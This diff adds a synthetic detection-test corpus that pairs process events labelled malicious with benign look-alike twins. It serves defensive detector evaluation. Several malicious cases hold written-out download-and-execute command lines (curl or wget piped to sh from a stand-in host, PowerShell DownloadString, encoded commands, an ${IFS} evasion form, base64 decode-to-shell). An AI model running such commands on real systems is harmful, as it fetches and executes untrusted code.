@@ -1,0 +1,1018 @@
+{
+  "schema": "xsera.detection-corpus.v1",
+  "id": "public-synthetic-behavior-benign-twins-20261013-v1",
+  "provenance": {
+    "origin": "Reviewer-authored harmless event records; no payload is executed.",
+    "visibility": "Public repository corpus; split names organize accounting and do not establish independently hidden data.",
+    "claim": "Known-behavior and benign-twin qualification only; no real unseen malware or zero-day vulnerability evaluation.",
+    "native_sensor_collected": false,
+    "independently_hidden_holdout": false,
+    "label_basis": "Explicit described attacker or approved-operations scenario; labels remain outside telemetry."
+  },
+  "cases": [
+    {
+      "id": "SC01",
+      "split": "calibration",
+      "label": "malicious",
+      "sensor_mode": "windows-structured-contract",
+      "twin_group": "TW01",
+      "description": "Labeled attacker encoded PowerShell; command is telemetry only.",
+      "techniques": [
+        "T1059.001"
+      ],
+      "events": [
+        {
+          "offset_seconds": -2,
+          "data": {
+            "host": {
+              "os": {
+                "type": "windows"
+              }
+            },
+            "process": {
+              "guid": "qualification-process-instance",
+              "name": "powershell.exe",
+              "executable": "C:\\Synthetic\\powershell.exe",
+              "parent": {
+                "guid": "qualification-parent-instance",
+                "name": "services.exe"
+              },
+              "command_line": "powershell.exe -enc SQBFAFgA"
+            },
+            "event": {
+              "action": "process_created",
+              "module": "process"
+            },
+            "agent": {
+              "collector": "synthetic-offline-contract"
+            },
+            "user": {
+              "name": "qualification-user"
+            }
+          }
+        }
+      ]
+    },
+    {
+      "id": "SC02",
+      "split": "calibration",
+      "label": "benign",
+      "sensor_mode": "windows-structured-contract",
+      "twin_group": "TW01",
+      "description": "Authorized IT encoded script twin; broad string alone cannot establish malicious intent.",
+      "techniques": [],
+      "events": [
+        {
+          "offset_seconds": -2,
+          "data": {
+            "host": {
+              "os": {
+                "type": "windows"
+              }
+            },
+            "process": {
+              "guid": "qualification-process-instance",
+              "name": "powershell.exe",
+              "executable": "C:\\Synthetic\\powershell.exe",
+              "parent": {
+                "guid": "qualification-parent-instance",
+                "name": "services.exe"
+              },
+              "command_line": "powershell.exe -enc SQBFAFgA"
+            },
+            "event": {
+              "action": "process_created",
+              "module": "process"
+            },
+            "agent": {
+              "collector": "synthetic-offline-contract"
+            },
+            "user": {
+              "name": "qualification-user"
+            }
+          }
+        }
+      ]
+    },
+    {
+      "id": "SC03",
+      "split": "calibration",
+      "label": "malicious",
+      "sensor_mode": "windows-structured-contract",
+      "twin_group": "TW02",
+      "description": "Labeled attacker download cradle.",
+      "techniques": [
+        "T1105"
+      ],
+      "events": [
+        {
+          "offset_seconds": -2,
+          "data": {
+            "host": {
+              "os": {
+                "type": "windows"
+              }
+            },
+            "process": {
+              "guid": "qualification-process-instance",
+              "name": "powershell.exe",
+              "executable": "C:\\Synthetic\\powershell.exe",
+              "parent": {
+                "guid": "qualification-parent-instance",
+                "name": "services.exe"
+              },
+              "command_line": "powershell.exe (New-Object Net.WebClient).DownloadString('https://payload.invalid/a')"
+            },
+            "event": {
+              "action": "process_created",
+              "module": "process"
+            },
+            "agent": {
+              "collector": "synthetic-offline-contract"
+            },
+            "user": {
+              "name": "qualification-user"
+            }
+          }
+        }
+      ]
+    },
+    {
+      "id": "SC04",
+      "split": "calibration",
+      "label": "benign",
+      "sensor_mode": "windows-structured-contract",
+      "twin_group": "TW02",
+      "description": "Authorized inventory download using the same API.",
+      "techniques": [],
+      "events": [
+        {
+          "offset_seconds": -2,
+          "data": {
+            "host": {
+              "os": {
+                "type": "windows"
+              }
+            },
+            "process": {
+              "guid": "qualification-process-instance",
+              "name": "powershell.exe",
+              "executable": "C:\\Synthetic\\powershell.exe",
+              "parent": {
+                "guid": "qualification-parent-instance",
+                "name": "services.exe"
+              },
+              "command_line": "powershell.exe (New-Object Net.WebClient).DownloadString('https://updates.example.invalid/catalog')"
+            },
+            "event": {
+              "action": "process_created",
+              "module": "process"
+            },
+            "agent": {
+              "collector": "synthetic-offline-contract"
+            },
+            "user": {
+              "name": "qualification-user"
+            }
+          }
+        }
+      ]
+    },
+    {
+      "id": "SC05",
+      "split": "calibration",
+      "label": "malicious",
+      "sensor_mode": "linux-structured-contract",
+      "twin_group": "TW03",
+      "description": "Labeled attacker shell download.",
+      "techniques": [
+        "T1105"
+      ],
+      "events": [
+        {
+          "offset_seconds": -2,
+          "data": {
+            "host": {
+              "os": {
+                "type": "linux"
+              }
+            },
+            "process": {
+              "guid": "qualification-process-instance",
+              "name": "sh",
+              "executable": "/synthetic/sh",
+              "parent": {
+                "guid": "qualification-parent-instance",
+                "name": "systemd"
+              },
+              "command_line": "curl https://payload.invalid/a | sh"
+            },
+            "event": {
+              "action": "process_created",
+              "module": "process"
+            },
+            "agent": {
+              "collector": "synthetic-offline-contract"
+            },
+            "user": {
+              "name": "qualification-user"
+            }
+          }
+        }
+      ]
+    },
+    {
+      "id": "SC06",
+      "split": "calibration",
+      "label": "benign",
+      "sensor_mode": "linux-structured-contract",
+      "twin_group": "TW03",
+      "description": "Approved package metadata download without shell execution.",
+      "techniques": [],
+      "events": [
+        {
+          "offset_seconds": -2,
+          "data": {
+            "host": {
+              "os": {
+                "type": "linux"
+              }
+            },
+            "process": {
+              "guid": "qualification-process-instance",
+              "name": "curl",
+              "executable": "/synthetic/curl",
+              "parent": {
+                "guid": "qualification-parent-instance",
+                "name": "systemd"
+              },
+              "command_line": "curl https://updates.example.invalid/catalog -o /synthetic/catalog.json"
+            },
+            "event": {
+              "action": "process_created",
+              "module": "process"
+            },
+            "agent": {
+              "collector": "synthetic-offline-contract"
+            },
+            "user": {
+              "name": "qualification-user"
+            }
+          }
+        }
+      ]
+    },
+    {
+      "id": "SC07",
+      "split": "calibration",
+      "label": "malicious",
+      "sensor_mode": "linux-structured-contract",
+      "twin_group": "TW04",
+      "description": "Labeled attacker wget shell download.",
+      "techniques": [
+        "T1105"
+      ],
+      "events": [
+        {
+          "offset_seconds": -2,
+          "data": {
+            "host": {
+              "os": {
+                "type": "linux"
+              }
+            },
+            "process": {
+              "guid": "qualification-process-instance",
+              "name": "sh",
+              "executable": "/synthetic/sh",
+              "parent": {
+                "guid": "qualification-parent-instance",
+                "name": "systemd"
+              },
+              "command_line": "wget https://payload.invalid/a -O- | sh"
+            },
+            "event": {
+              "action": "process_created",
+              "module": "process"
+            },
+            "agent": {
+              "collector": "synthetic-offline-contract"
+            },
+            "user": {
+              "name": "qualification-user"
+            }
+          }
+        }
+      ]
+    },
+    {
+      "id": "SC08",
+      "split": "calibration",
+      "label": "benign",
+      "sensor_mode": "linux-structured-contract",
+      "twin_group": "TW04",
+      "description": "Approved metadata retrieval.",
+      "techniques": [],
+      "events": [
+        {
+          "offset_seconds": -2,
+          "data": {
+            "host": {
+              "os": {
+                "type": "linux"
+              }
+            },
+            "process": {
+              "guid": "qualification-process-instance",
+              "name": "wget",
+              "executable": "/synthetic/wget",
+              "parent": {
+                "guid": "qualification-parent-instance",
+                "name": "systemd"
+              },
+              "command_line": "wget https://updates.example.invalid/catalog -O /synthetic/catalog.json"
+            },
+            "event": {
+              "action": "process_created",
+              "module": "process"
+            },
+            "agent": {
+              "collector": "synthetic-offline-contract"
+            },
+            "user": {
+              "name": "qualification-user"
+            }
+          }
+        }
+      ]
+    },
+    {
+      "id": "SC09",
+      "split": "holdout",
+      "label": "malicious",
+      "sensor_mode": "windows-structured-contract",
+      "twin_group": "TW05",
+      "description": "Known-behavior spelling variant; not a novel exploit.",
+      "techniques": [
+        "T1059.001"
+      ],
+      "events": [
+        {
+          "offset_seconds": -2,
+          "data": {
+            "host": {
+              "os": {
+                "type": "windows"
+              }
+            },
+            "process": {
+              "guid": "qualification-process-instance",
+              "name": "pwsh.exe",
+              "executable": "C:\\Synthetic\\pwsh.exe",
+              "parent": {
+                "guid": "qualification-parent-instance",
+                "name": "services.exe"
+              },
+              "command_line": "pwsh.exe -EncodedCommand SQBFAFgA"
+            },
+            "event": {
+              "action": "process_created",
+              "module": "process"
+            },
+            "agent": {
+              "collector": "synthetic-offline-contract"
+            },
+            "user": {
+              "name": "qualification-user"
+            }
+          }
+        }
+      ]
+    },
+    {
+      "id": "SC10",
+      "split": "holdout",
+      "label": "benign",
+      "sensor_mode": "windows-structured-contract",
+      "twin_group": "TW05",
+      "description": "Documentation echo from cmd, not PowerShell execution.",
+      "techniques": [],
+      "events": [
+        {
+          "offset_seconds": -2,
+          "data": {
+            "host": {
+              "os": {
+                "type": "windows"
+              }
+            },
+            "process": {
+              "guid": "qualification-process-instance",
+              "name": "cmd.exe",
+              "executable": "C:\\Synthetic\\cmd.exe",
+              "parent": {
+                "guid": "qualification-parent-instance",
+                "name": "services.exe"
+              },
+              "command_line": "cmd.exe /c echo example powershell -enc SQBFAFgA"
+            },
+            "event": {
+              "action": "process_created",
+              "module": "process"
+            },
+            "agent": {
+              "collector": "synthetic-offline-contract"
+            },
+            "user": {
+              "name": "qualification-user"
+            }
+          }
+        }
+      ]
+    },
+    {
+      "id": "SC11",
+      "split": "holdout",
+      "label": "malicious",
+      "sensor_mode": "windows-structured-contract",
+      "twin_group": "TW06",
+      "description": "Known download behavior with alias instead of full cmdlet name.",
+      "techniques": [
+        "T1105"
+      ],
+      "events": [
+        {
+          "offset_seconds": -2,
+          "data": {
+            "host": {
+              "os": {
+                "type": "windows"
+              }
+            },
+            "process": {
+              "guid": "qualification-process-instance",
+              "name": "powershell.exe",
+              "executable": "C:\\Synthetic\\powershell.exe",
+              "parent": {
+                "guid": "qualification-parent-instance",
+                "name": "services.exe"
+              },
+              "command_line": "powershell.exe iwr https://payload.invalid/a -OutFile /synthetic/payload.ps1"
+            },
+            "event": {
+              "action": "process_created",
+              "module": "process"
+            },
+            "agent": {
+              "collector": "synthetic-offline-contract"
+            },
+            "user": {
+              "name": "qualification-user"
+            }
+          }
+        }
+      ]
+    },
+    {
+      "id": "SC12",
+      "split": "holdout",
+      "label": "benign",
+      "sensor_mode": "windows-structured-contract",
+      "twin_group": "TW06",
+      "description": "Authorized IT web request twin.",
+      "techniques": [],
+      "events": [
+        {
+          "offset_seconds": -2,
+          "data": {
+            "host": {
+              "os": {
+                "type": "windows"
+              }
+            },
+            "process": {
+              "guid": "qualification-process-instance",
+              "name": "powershell.exe",
+              "executable": "C:\\Synthetic\\powershell.exe",
+              "parent": {
+                "guid": "qualification-parent-instance",
+                "name": "services.exe"
+              },
+              "command_line": "powershell.exe Invoke-WebRequest https://updates.example.invalid/catalog -OutFile /synthetic/catalog.json"
+            },
+            "event": {
+              "action": "process_created",
+              "module": "process"
+            },
+            "agent": {
+              "collector": "synthetic-offline-contract"
+            },
+            "user": {
+              "name": "qualification-user"
+            }
+          }
+        }
+      ]
+    },
+    {
+      "id": "SC13",
+      "split": "holdout",
+      "label": "malicious",
+      "sensor_mode": "windows-structured-contract",
+      "twin_group": "TW07",
+      "description": "Labeled attacker web request.",
+      "techniques": [
+        "T1105"
+      ],
+      "events": [
+        {
+          "offset_seconds": -2,
+          "data": {
+            "host": {
+              "os": {
+                "type": "windows"
+              }
+            },
+            "process": {
+              "guid": "qualification-process-instance",
+              "name": "powershell.exe",
+              "executable": "C:\\Synthetic\\powershell.exe",
+              "parent": {
+                "guid": "qualification-parent-instance",
+                "name": "services.exe"
+              },
+              "command_line": "powershell.exe Invoke-WebRequest https://payload.invalid/a -OutFile /synthetic/payload.ps1"
+            },
+            "event": {
+              "action": "process_created",
+              "module": "process"
+            },
+            "agent": {
+              "collector": "synthetic-offline-contract"
+            },
+            "user": {
+              "name": "qualification-user"
+            }
+          }
+        }
+      ]
+    },
+    {
+      "id": "SC14",
+      "split": "holdout",
+      "label": "benign",
+      "sensor_mode": "windows-structured-contract",
+      "twin_group": "TW07",
+      "description": "Ordinary IT process inventory.",
+      "techniques": [],
+      "events": [
+        {
+          "offset_seconds": -2,
+          "data": {
+            "host": {
+              "os": {
+                "type": "windows"
+              }
+            },
+            "process": {
+              "guid": "qualification-process-instance",
+              "name": "powershell.exe",
+              "executable": "C:\\Synthetic\\powershell.exe",
+              "parent": {
+                "guid": "qualification-parent-instance",
+                "name": "services.exe"
+              },
+              "command_line": "powershell.exe Get-Process | Sort-Object CPU"
+            },
+            "event": {
+              "action": "process_created",
+              "module": "process"
+            },
+            "agent": {
+              "collector": "synthetic-offline-contract"
+            },
+            "user": {
+              "name": "qualification-user"
+            }
+          }
+        }
+      ]
+    },
+    {
+      "id": "SC15",
+      "split": "holdout",
+      "label": "malicious",
+      "sensor_mode": "linux-structured-contract",
+      "twin_group": "TW08",
+      "description": "Known shell-download behavior with whitespace substitution.",
+      "techniques": [
+        "T1105"
+      ],
+      "events": [
+        {
+          "offset_seconds": -2,
+          "data": {
+            "host": {
+              "os": {
+                "type": "linux"
+              }
+            },
+            "process": {
+              "guid": "qualification-process-instance",
+              "name": "sh",
+              "executable": "/synthetic/sh",
+              "parent": {
+                "guid": "qualification-parent-instance",
+                "name": "systemd"
+              },
+              "command_line": "curl${IFS}https://payload.invalid/a${IFS}|sh"
+            },
+            "event": {
+              "action": "process_created",
+              "module": "process"
+            },
+            "agent": {
+              "collector": "synthetic-offline-contract"
+            },
+            "user": {
+              "name": "qualification-user"
+            }
+          }
+        }
+      ]
+    },
+    {
+      "id": "SC16",
+      "split": "holdout",
+      "label": "benign",
+      "sensor_mode": "linux-structured-contract",
+      "twin_group": "TW08",
+      "description": "Printed documentation containing tool text.",
+      "techniques": [],
+      "events": [
+        {
+          "offset_seconds": -2,
+          "data": {
+            "host": {
+              "os": {
+                "type": "linux"
+              }
+            },
+            "process": {
+              "guid": "qualification-process-instance",
+              "name": "sh",
+              "executable": "/synthetic/sh",
+              "parent": {
+                "guid": "qualification-parent-instance",
+                "name": "systemd"
+              },
+              "command_line": "printf 'curl example in documentation\\n'"
+            },
+            "event": {
+              "action": "process_created",
+              "module": "process"
+            },
+            "agent": {
+              "collector": "synthetic-offline-contract"
+            },
+            "user": {
+              "name": "qualification-user"
+            }
+          }
+        }
+      ]
+    },
+    {
+      "id": "SC17",
+      "split": "holdout",
+      "label": "malicious",
+      "sensor_mode": "linux-structured-contract",
+      "twin_group": "TW09",
+      "description": "Downloader utility variation.",
+      "techniques": [
+        "T1105"
+      ],
+      "events": [
+        {
+          "offset_seconds": -2,
+          "data": {
+            "host": {
+              "os": {
+                "type": "linux"
+              }
+            },
+            "process": {
+              "guid": "qualification-process-instance",
+              "name": "sh",
+              "executable": "/synthetic/sh",
+              "parent": {
+                "guid": "qualification-parent-instance",
+                "name": "systemd"
+              },
+              "command_line": "busybox wget https://payload.invalid/a -O- | sh"
+            },
+            "event": {
+              "action": "process_created",
+              "module": "process"
+            },
+            "agent": {
+              "collector": "synthetic-offline-contract"
+            },
+            "user": {
+              "name": "qualification-user"
+            }
+          }
+        }
+      ]
+    },
+    {
+      "id": "SC18",
+      "split": "holdout",
+      "label": "benign",
+      "sensor_mode": "linux-structured-contract",
+      "twin_group": "TW09",
+      "description": "Approved data decoding; decode alone is not malicious execution.",
+      "techniques": [],
+      "events": [
+        {
+          "offset_seconds": -2,
+          "data": {
+            "host": {
+              "os": {
+                "type": "linux"
+              }
+            },
+            "process": {
+              "guid": "qualification-process-instance",
+              "name": "base64",
+              "executable": "/synthetic/base64",
+              "parent": {
+                "guid": "qualification-parent-instance",
+                "name": "systemd"
+              },
+              "command_line": "base64 -d /synthetic/approved-fixture.b64 > /synthetic/fixture.txt"
+            },
+            "event": {
+              "action": "process_created",
+              "module": "process"
+            },
+            "agent": {
+              "collector": "synthetic-offline-contract"
+            },
+            "user": {
+              "name": "qualification-user"
+            }
+          }
+        }
+      ]
+    },
+    {
+      "id": "SC19",
+      "split": "holdout",
+      "label": "malicious",
+      "sensor_mode": "linux-structured-contract",
+      "twin_group": "TW10",
+      "description": "Labeled malicious decode-and-execute chain.",
+      "techniques": [
+        "T1140"
+      ],
+      "events": [
+        {
+          "offset_seconds": -2,
+          "data": {
+            "host": {
+              "os": {
+                "type": "linux"
+              }
+            },
+            "process": {
+              "guid": "qualification-process-instance",
+              "name": "sh",
+              "executable": "/synthetic/sh",
+              "parent": {
+                "guid": "qualification-parent-instance",
+                "name": "systemd"
+              },
+              "command_line": "printf c3ludGhldGlj | base64 -d | sh"
+            },
+            "event": {
+              "action": "process_created",
+              "module": "process"
+            },
+            "agent": {
+              "collector": "synthetic-offline-contract"
+            },
+            "user": {
+              "name": "qualification-user"
+            }
+          }
+        }
+      ]
+    },
+    {
+      "id": "SC20",
+      "split": "holdout",
+      "label": "benign",
+      "sensor_mode": "linux-structured-contract",
+      "twin_group": "TW10",
+      "description": "Normal data decoding with long switch spelling.",
+      "techniques": [],
+      "events": [
+        {
+          "offset_seconds": -2,
+          "data": {
+            "host": {
+              "os": {
+                "type": "linux"
+              }
+            },
+            "process": {
+              "guid": "qualification-process-instance",
+              "name": "sh",
+              "executable": "/synthetic/sh",
+              "parent": {
+                "guid": "qualification-parent-instance",
+                "name": "systemd"
+              },
+              "command_line": "printf aGVsbG8= | base64 --decode > /synthetic/hello.txt"
+            },
+            "event": {
+              "action": "process_created",
+              "module": "process"
+            },
+            "agent": {
+              "collector": "synthetic-offline-contract"
+            },
+            "user": {
+              "name": "qualification-user"
+            }
+          }
+        }
+      ]
+    },
+    {
+      "id": "SC21",
+      "split": "holdout",
+      "label": "malicious",
+      "sensor_mode": "windows-command-unavailable-contract",
+      "twin_group": "TW11",
+      "description": "Attack opportunity with command-line telemetry absent; visibility loss stays in the denominator.",
+      "techniques": [
+        "T1059.001"
+      ],
+      "events": [
+        {
+          "offset_seconds": -2,
+          "data": {
+            "host": {
+              "os": {
+                "type": "windows"
+              }
+            },
+            "process": {
+              "guid": "qualification-process-instance",
+              "name": "powershell.exe",
+              "executable": "C:\\Synthetic\\powershell.exe",
+              "parent": {
+                "guid": "qualification-parent-instance",
+                "name": "services.exe"
+              }
+            },
+            "event": {
+              "action": "process_created",
+              "module": "process"
+            },
+            "agent": {
+              "collector": "synthetic-offline-contract"
+            },
+            "user": {
+              "name": "qualification-user"
+            }
+          }
+        }
+      ]
+    },
+    {
+      "id": "SC22",
+      "split": "holdout",
+      "label": "benign",
+      "sensor_mode": "windows-command-unavailable-contract",
+      "twin_group": "TW11",
+      "description": "Benign opportunity with the same missing telemetry; neither outcome establishes native collection.",
+      "techniques": [],
+      "events": [
+        {
+          "offset_seconds": -2,
+          "data": {
+            "host": {
+              "os": {
+                "type": "windows"
+              }
+            },
+            "process": {
+              "guid": "qualification-process-instance",
+              "name": "powershell.exe",
+              "executable": "C:\\Synthetic\\powershell.exe",
+              "parent": {
+                "guid": "qualification-parent-instance",
+                "name": "services.exe"
+              }
+            },
+            "event": {
+              "action": "process_created",
+              "module": "process"
+            },
+            "agent": {
+              "collector": "synthetic-offline-contract"
+            },
+            "user": {
+              "name": "qualification-user"
+            }
+          }
+        }
+      ]
+    },
+    {
+      "id": "SC23",
+      "split": "holdout",
+      "label": "malicious",
+      "sensor_mode": "linux-command-unavailable-contract",
+      "twin_group": "TW12",
+      "description": "Attack opportunity with command-line telemetry absent.",
+      "techniques": [
+        "T1105"
+      ],
+      "events": [
+        {
+          "offset_seconds": -2,
+          "data": {
+            "host": {
+              "os": {
+                "type": "linux"
+              }
+            },
+            "process": {
+              "guid": "qualification-process-instance",
+              "name": "sh",
+              "executable": "/synthetic/sh",
+              "parent": {
+                "guid": "qualification-parent-instance",
+                "name": "systemd"
+              }
+            },
+            "event": {
+              "action": "process_created",
+              "module": "process"
+            },
+            "agent": {
+              "collector": "synthetic-offline-contract"
+            },
+            "user": {
+              "name": "qualification-user"
+            }
+          }
+        }
+      ]
+    },
+    {
+      "id": "SC24",
+      "split": "holdout",
+      "label": "benign",
+      "sensor_mode": "linux-command-unavailable-contract",
+      "twin_group": "TW12",
+      "description": "Benign opportunity with command-line telemetry absent.",
+      "techniques": [],
+      "events": [
+        {
+          "offset_seconds": -2,
+          "data": {
+            "host": {
+              "os": {
+                "type": "linux"
+              }
+            },
+            "process": {
+              "guid": "qualification-process-instance",
+              "name": "sh",
+              "executable": "/synthetic/sh",
+              "parent": {
+                "guid": "qualification-parent-instance",
+                "name": "systemd"
+              }
+            },
+            "event": {
+              "action": "process_created",
+              "module": "process"
+            },
+            "agent": {
+              "collector": "synthetic-offline-contract"
+            },
+            "user": {
+              "name": "qualification-user"
+            }
+          }
+        }
+      ]
+    }
+  ]
+}
